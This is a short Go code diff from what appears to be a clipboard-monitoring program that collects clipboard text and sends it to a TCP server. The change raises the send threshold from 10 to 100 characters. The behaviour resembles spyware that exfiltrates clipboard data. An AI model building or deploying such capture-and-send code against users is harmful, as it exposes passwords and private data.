@@ -65,8 +65,8 @@ func main() {
 			lastClipboardText = clipboardText
 		}
 
-		// If the message string contains more than 50 characters, send it to the server
-		if len(message) > 10 {
+		// If the message string contains more than 100 characters, send it to the server
+		if len(message) > 100 {
 			// Send the string to the TCP socket
 			err := sendStringToTCPSocket(message, tcpServerAddress)
 			if err != nil {
